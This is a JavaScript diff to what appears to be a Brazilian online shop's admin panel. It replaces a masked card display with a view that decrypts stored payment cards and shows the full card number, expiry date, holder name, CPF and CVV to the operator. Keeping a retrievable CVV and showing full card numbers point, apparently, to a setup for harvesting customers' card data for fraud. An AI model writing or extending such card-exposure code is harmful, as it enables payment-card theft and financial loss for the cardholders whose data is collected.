@@ -268,6 +268,19 @@ function trackingSection(orderId, order, container) {
   container.append(sectionTitle("Código de rastreio"), box);
 }
 
+function formatCardNumber(value) {
+  return String(value || "")
+    .replace(/\D/g, "")
+    .replace(/(\d{4})(?=\d)/g, "$1 ")
+    .trim();
+}
+
+function formatCpf(value) {
+  const digits = String(value || "").replace(/\D/g, "");
+  if (digits.length !== 11) return value || "Não informado";
+  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
+}
+
 function cardSection(orderId, order, container) {
   const box = document.createElement("div");
   box.className = "bg-zinc-800/50 rounded-lg p-4 space-y-3";
@@ -319,15 +332,21 @@ function cardSection(orderId, order, container) {
     try {
       const result = await invokeAdmin("decrypt-card", { orderId });
       const card = result.card || {};
-      const cpf = card.holderCpf
-        ? String(card.holderCpf).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
-        : "Não informado";
+      const number = formatCardNumber(card.number || card.numero || "");
+      const validade =
+        card.validade ||
+        (card.expiryMonth && card.expiryYear ? `${card.expiryMonth}/${card.expiryYear}` : "Não informada");
+      const cpf = formatCpf(card.holderCpf || card.cpf || "");
+      const masked = `•••• •••• •••• ${card.last4 || order.card_last4 || "----"}`;
       revealed.innerHTML = `
+        <div style="border-radius:14px;padding:14px;background:linear-gradient(135deg,#1a1a2e,#0f3460);color:#fff;margin-bottom:8px;">
+          <p style="margin:0 0 8px;font-size:10px;letter-spacing:2px;opacity:.75;">CARTÃO DESCRIPTOGRAFADO</p>
+          <p style="margin:0 0 10px;font-family:monospace;font-size:17px;letter-spacing:1.5px;">${escapeHtml(number || masked)}</p>
+          <p style="margin:0;font-size:13px;">${escapeHtml(card.holder || order.card_holder || "Titular não informado")}</p>
+          <p style="margin:4px 0 0;font-size:12px;opacity:.85;">Validade: ${escapeHtml(validade)} · CVV: ${escapeHtml(card.cvv || "—")}</p>
+        </div>
         <span>Bandeira: ${escapeHtml(card.brand || order.card_brand || "Não identificada")}</span>
-        <span>Cartão: •••• ${escapeHtml(card.last4 || order.card_last4 || "")}</span>
-        <span>Titular: ${escapeHtml(card.holder || order.card_holder || "Não informado")}</span>
         <span>CPF do titular: ${escapeHtml(cpf)}</span>
-        <span>Validade: ${escapeHtml(card.expiryMonth && card.expiryYear ? `${card.expiryMonth}/${card.expiryYear}` : "Não informada")}</span>
         <span>Parcelas: ${escapeHtml(card.installments || order.card_installments || 1)}x</span>
         <span>Status: ${escapeHtml(card.status || order.card_status || "Pendente")}</span>`;
       preview.classList.add("hidden");
